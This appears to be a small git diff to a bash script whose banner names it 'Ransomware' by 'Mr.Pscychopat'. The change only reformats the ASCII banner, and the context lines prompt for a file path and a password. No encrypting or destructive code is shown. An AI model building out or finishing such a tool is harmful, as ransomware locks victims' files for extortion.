@@ -1,10 +1,10 @@
 #!/bin/bash
 clear;
 echo "
-################
-#  Ransomware  # Contact : yogastejak@gmail.com
+####################
+#  Ransomware      # Contact : yogastejak@gmail.com
 # By Mr.Pscychopat # Copyright (c) 2018 Yogas Teja Kusuma
-################";
+####################";
 echo "";
 read -p "File Path : " pathfile;
 read -p "Password  : " password;
